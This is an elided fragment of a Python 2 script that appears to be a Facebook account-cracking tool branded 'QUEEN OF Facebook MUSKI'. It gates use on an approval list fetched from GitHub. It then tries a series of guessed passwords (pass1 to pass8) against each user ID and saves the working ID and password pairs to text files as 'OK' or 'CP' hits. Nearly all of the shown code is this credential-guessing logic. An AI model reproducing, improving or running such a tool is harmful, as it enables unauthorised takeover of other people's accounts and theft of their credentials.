...
def reg():
    ...
    print logo
    print ''
    print '\x1b[1;31;1m         Take The Approval For Login '
    print ''
    time.sleep(1)
    try:
    ...
    r = requests.get('https://raw.githubusercontent.com/xtylishpathani302/queen/main/server.txt').text
    if to in r:
        ...
        os.system('clear')
        print logo
        print '  \x1b[1;91m       Approved Failed'
...
def reg2():
    os.system('clear')
    print logo
    print '  \x1b[1;91m           Approval not detected'
    print ' \x1b[1;92mCopy and press enter , and select Facebook'
...
def c_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[MUSKI-OK]' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/muski_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;91m[MUSKI-CP] ' + uid + ' | ' + pass1
                cp = open('MUSKI_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[MUSKI-OK]' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/muski_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;91m[MUSKI-CP] ' + uid + ' | ' + pass2
                    cp = open('MUSKI_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[MUSKI-OK]' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/muski_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;91m[MUSKI-CP] ' + uid + ' | ' + pass3
                        cp = open('MUSKI_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[MUSKI-OK]' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/muski_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;91m[MUSKI-CP] ' + uid + ' | ' + pass4
                            cp = open('MUSKI_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[MUSKI-OK]' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/muski_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;91m[MUSKI-CP] ' + uid + ' | ' + pass5
                                cp = open('MUSKI_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[MUSKI-OK]' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/muski_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;91m[MUSKI-CP] ' + uid + ' | ' + pass6
                                    cp = open('MUSKI_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
...
def n_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94m  QUEEN OF Facebook MUSKI\x1b[1;91m'
    print 47 * '-'
                        ...
                        if 'loc' in q:
                            ...
                            if 'loc' in q:
                                ...
                                if 'loc' in q:
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[MUSKI-OK]' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/muski_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;91m[MUSKI-CP] ' + uid + ' | ' + pass7
                                        cp = open('MUSKI_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[MUSKI-OK]' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/muski_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;91m[MUSKI-CP] ' + uid + ' | ' + pass8
                                            cp = open('MUSKI_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
